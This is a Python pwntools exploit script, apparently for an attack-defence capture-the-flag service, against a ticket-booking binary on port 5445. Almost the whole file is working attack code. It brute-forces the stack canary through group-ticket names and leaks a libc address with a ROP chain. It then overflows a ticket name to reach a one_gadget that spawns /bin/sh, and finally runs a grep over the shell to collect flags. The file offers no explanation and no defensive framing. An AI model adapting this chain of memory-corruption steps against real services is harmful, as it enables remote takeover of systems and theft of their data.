import random

from pwn import *

#context.log_level = 'debug'

TIMEOUT = 1

# without groupname but with maxxed src/dst/date
username_to_canary = 31
username_to_eip = 39
# code structure:
# <group>:<date>:<start>:<dest>:<ticket_nr>:<name>
offset_to_canary = 0 + 1 + 10 + 1 + 49 + 1 + 49 + 1 +1 + 31
offset_to_saved_eip = offset_to_canary + 8

class API:
    def __init__(self, r):
        self.r = r

    def login(self, username, password):
        #print(f'Attempting to login {username=} {password=}')
        self.r.recvuntil(b'Are you already registered?')
        self.r.sendline(b'1') # Yes
        self.r.recvuntil(b'username:')
        self.r.send(username)
        self.r.recvuntil(b'password:')
        self.r.send(password)
        self.r.recvuntil(b'logged in!')

    def register(self, username, password):
        #print(f'Attempting to register {username=} {password=}')
        self.r.recvuntil(b'Are you already registered? \n1 - Yes \n2 - No \n')
        self.r.sendline(b'2') # No
        self.r.recvuntil(b'username:')
        self.r.send(username)
        self.r.recvuntil(b'password:')
        self.r.send(password)
        self.r.recvuntil(b'new account and logged in.\n')

    def single_ticket(self, ticket_date, ticket_dest, ticket_start, ticket_name):
        #print(f'Attempting to buy a single ticket {ticket_date=} {ticket_dest=} {ticket_start=} {ticket_name=}')
        self.r.recvuntil(b'5 - Exit \n')
        self.r.sendline(b'1') # Buy a single ticket
        self.r.recvuntil(b'obtaining the tickets later:')
        ticket_key = self.r.recvline(timeout=TIMEOUT).strip()
        self.r.recvuntil(b'<dd.mm.yyyy>')
        self.r.send(ticket_date)
        self.r.recvuntil(b'want to go?')
        self.r.send(ticket_dest)
        self.r.recvuntil(b'want to start?')
        self.r.send(ticket_start)
        self.r.recvuntil(b'ticket is it?')
        self.r.send(ticket_name)
        return ticket_key

    def group_ticket(self, ticket_group, ticket_date, ticket_dest, ticket_start, ticket_names):
        #print(f'Attempting to buy a group ticket {ticket_group=} {ticket_date=} {ticket_dest=} {ticket_start=} {ticket_names=}')
        self.r.recvuntil(b'5 - Exit \n')
        self.r.sendline(b'2') # Buy a single ticket
        self.r.recvuntil(b'obtaining the tickets later:')
        ticket_key = self.r.recvline(timeout=TIMEOUT).strip()
        self.r.recvuntil(b'many members has your group?')
        self.r.sendline(f"{len(ticket_names)}".encode())
        self.r.recvuntil(b'your group name?')
        self.r.send(ticket_group)
        self.r.recvuntil(b'<dd.mm.yyyy>')
        self.r.send(ticket_date)
        self.r.recvuntil(b'want to travel?')
        self.r.send(ticket_dest)
        self.r.recvuntil(b'want to start?')
        self.r.send(ticket_start)
        self.r.recvuntil(b'one by one')
        for ticket_name in ticket_names:
            self.r.recvuntil(b'group member')
            self.r.send(ticket_name)
        tickets = [line for line in self.r.recvuntil(b'back to main Menu').splitlines() if line.count(b':')>5]

        return ticket_key, tickets

def leak_canary(api):
    canary = b''
    for s in range(4):
        key, tickets = api.group_ticket(b'g'*40, b't'*8, b'd'*40, b's'*40, [cyclic(7)+canary+bytes([i]) for i in range(256)])
        if len(tickets) == 1:
            #print(tickets[0])
            canary += bytes([int(tickets[0].split(b':')[5].decode())])
        else:
            raise ValueError('got more than one ticket while destroying canary!!')
            #print(f'Got {len(tickets)} tickets: {tickets}')
    print(f'Leaked canary: {canary}')
    return canary

def leak_libc_offset(api, canary):
    # leak addr of puts, loop back to main
    # e = ELF('./saarsecVV')        +--addr of ':%s\0'
    # rop = ROP(e)                  v 
    # rop.call(e.plt["printf"], [0x0804C1B8 + 12, e.got["puts"]])
                            #-> now 0x804c4fc
    # rop.call(e.sym["main"])
    # chain = rop.chain()

    #chain = b'`\x90\x04\x08D\x95\x04\x08\xc4\xc1\x04\x08<\xe0\x04\x08\x8a\xb0\x04\x08'
    #new:
    chain = b'`\x90\x04\x08D\x95\x04\x08\xfc\xc4\x04\x088\xf0\x04\x08\x8a\xb0\x04\x08'


    api.single_ticket(b'aaaa',b'bbbb',b'cccc', b'X'*129 + canary + b'AAAABBBBCCCC' + chain)
    d = api.r.recvuntil(b'transportation !!')
    print(d)
    print(hexdump(d.split(b':', maxsplit=1)[1]))
    puts_libc = 0x70420
    puts_loaded = int.from_bytes(d.split(b':', maxsplit=1)[1][:4], byteorder='little')
    libc_base = puts_loaded - puts_libc
    return libc_base

def shell(api, canary, libc_base):
    # $one_gadget ./libc-2.31.so 
    # 0x14306b execl("/bin/sh", eax)
    # constraints:
    #   ebp is the GOT address of libc
    #   eax == NULL
    # 
    # 0x14306c execl("/bin/sh", [esp])
    # constraints:
    #   ebp is the GOT address of libc   <- we can make that happen (readelf -d ./libc-2.31.so|grep PLTGOT)
    #   [esp] == NULL                    <- and that as well

    one_gadget = 0x14306c + libc_base
    chain = p32(one_gadget) + p32(0) # call one_gadget address and let make esp a NULL-ptr
    libc_got = libc_base + 0x1e5000 # PLTGOT value from above
    api.single_ticket(b'aaaa',b'bbbb',b'cccc', b'X'*129 + canary + b'AAAABBBB' + p32(libc_got) + chain)

def exploit(target, flag_ids_usernames):
    p = remote(target, 5445)
    api = API(p)
    username = f"Honk{random.randint(100,999)}"
    api.register(username.encode(), "password".encode())
    canary = leak_canary(api)
    libc_base = leak_libc_offset(api, canary)
    api.login(username.encode(), "password".encode())
    shell(api, canary, libc_base)
    p.sendline(b'grep -raohE \'SAAR{.*}\'|sort -u ; exit')
    print(p.recvall().decode())

if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
